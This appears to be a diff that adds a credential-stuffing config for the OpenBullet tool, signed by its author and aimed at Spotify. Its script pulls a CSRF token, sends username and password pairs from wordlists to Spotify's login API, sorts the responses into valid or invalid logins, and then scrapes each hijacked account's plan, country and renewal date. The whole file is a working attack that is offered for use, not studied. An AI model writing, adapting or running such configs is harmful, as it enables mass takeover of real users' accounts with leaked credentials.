@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "__Spotify",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-22T12:27:08.7923827+01:00",
+  "AdditionalInfo": "Patched by me. Let me know if the config needs a fix :P Special thanks to Adamousse <3",
+  "Author": "AncientBanana❤️",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" EncodeContent=TRUE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+#Login REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "InvalidCredentials" 
+  KEYCHAIN Success OR 
+    KEY "displayName" 
+
+#Capture REQUEST GET "https://www.spotify.com/uk/account/subscription/change/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture PARSE "<SOURCE>" LR "></svg></span>" "</h3><p class=\"subscription-status\">" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Capture PARSE "<SOURCE>" LR "<h2 class=\"your-plan-name\">" "<" CreateEmpty=FALSE -> CAP "Subscription" 
+
+#Capture PARSE "<SOURCE>" LR "'userCountry': '" "'" -> CAP "Country" 
+
+#TU_Country FUNCTION ToUppercase "<Country>" -> CAP "Country" 
+
+#Capture PARSE "<SOURCE>" LR "<b class=\"recurring-date\">" "<" CreateEmpty=FALSE -> CAP "Renewal" "" " | By:AncientBanana❤️Adamousse" 
+
+#Capture PARSE "<SOURCE>" LR "<p class=\"your-plan-desc\">You're a m" ".</p>" CreateEmpty=FALSE -> CAP "Note" "M" " | By:AncientBanana❤️Adamousse" 
+
+#Capture PARSE "<SOURCE>" LR "=\"subscription-status\">" "<" CreateEmpty=FALSE -> CAP "Note" "" " | By:AncientBanana❤️Adamousse" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Spotify Free" 
+  KEYCHAIN Success OR 
+    KEY "<h2 class=\"your-plan-name\">" 
+
